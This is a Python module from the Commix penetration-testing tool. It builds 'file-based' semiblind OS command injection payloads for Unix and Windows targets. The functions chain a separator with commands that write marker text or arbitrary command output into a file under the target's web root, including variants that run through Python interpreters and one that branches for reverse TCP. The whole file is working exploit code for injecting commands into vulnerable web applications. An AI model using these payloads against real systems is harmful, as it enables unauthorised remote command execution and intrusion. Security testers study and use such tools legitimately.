#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

"""
The "file-based" technique on semiblind OS command injection.
The available "file-based" payloads.
"""

from src.utils import settings
from src.core.controller import checks

"""
The output file, under the server's root directory, with its separators doubled so that a Windows
path survives being read as a Python string literal.
"""
def windows_output_path(OUTPUT_TEXTFILE):
  return (settings.WEB_ROOT + OUTPUT_TEXTFILE).replace("\\", "\\\\")

"""
File-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    # The marker is read back from the file over HTTP, so writing it is all the payload has to do.
    payload = (chain +
              settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
              settings.SINGLE_WHITESPACE + "'" + TAG + "'" + checks.windows_tail(chain)
              )
  else:
    payload = (separator +
              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
              )

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
Combined multi-tag decision payload for false-positive verification (Unix only).
"""
def decision_combined(separator, tags, OUTPUT_TEXTFILE):
  writes = []
  for index, tag in enumerate(tags):
    operator = settings.FILE_WRITE_OPERATOR if index == 0 else settings.FILE_APPEND_OPERATOR
    writes.append("echo " + tag + operator + settings.WEB_ROOT + OUTPUT_TEXTFILE)
  payload = separator + separator.join(writes)
  payload = checks.append_custom_marker(payload, separator)
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    payload = (chain +
              settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + windows_output_path(OUTPUT_TEXTFILE) + "','w').write('" + TAG + "')\"" +
              checks.windows_tail(chain)
              )
  else:
    payload = (separator +
              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )

    payload = checks.append_custom_marker(payload, separator)

  payload = checks.fix_newlines_for_headers(payload, separator)

  return payload

"""
Combined multi-tag decision_alter_interpreter payload for false-positive verification (Unix only).
"""
def decision_combined_alter_interpreter(separator, tags, OUTPUT_TEXTFILE):
  writes = "".join("f.write('" + tag + "')\n" for tag in tags)
  payload = (separator +
            settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\n" + writes + "f.close()\n\"" + settings.CMD_SUB_SUFFIX
             )

  payload = checks.append_custom_marker(payload, separator)

  payload = checks.fix_newlines_for_headers(payload, separator)

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
  if settings.TFB_DECIMAL == True:
    payload = (separator + cmd)

  elif settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    # The output is read back from the file, so it is redirected there rather than printed.
    payload = (chain +
              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
              checks.windows_tail(chain)
              )
  else:
    settings.USER_APPLIED_CMD = cmd
    payload = (separator +
              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
              )

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.REVERSE_TCP:
      payload = (chain + cmd + settings.SINGLE_WHITESPACE
                )
    else:
      payload = (chain +
                settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + windows_output_path(OUTPUT_TEXTFILE) + "')\"" +
                checks.windows_tail(chain)
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    payload = (separator +
              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + 
              settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
              )

    payload = checks.append_custom_marker(payload, separator)

  payload = checks.fix_newlines_for_headers(payload, separator)

  return payload

# eof
